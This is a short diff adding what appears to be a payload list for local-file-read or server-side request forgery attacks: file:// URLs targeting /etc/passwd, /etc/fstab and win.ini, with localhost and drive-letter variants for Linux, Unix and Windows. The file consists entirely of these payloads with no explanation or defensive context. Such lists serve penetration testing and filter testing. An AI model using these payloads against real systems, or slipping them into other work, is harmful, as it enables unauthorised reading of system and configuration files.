@@ -1,1 +1,11 @@
-
+payload :file：//host/path
+* Linux
+ file:///etc/passwd
+*  Unix
+ file://localhost/etc/fstab
+ file:///localhost/etc/fstab
+*  Windows
+ file:///c:/windows/win.ini
+ file://localhost/c:/windows/win.ini
+ file:///c|windows/win.ini
+ file://localhost/c|windows/win.ini
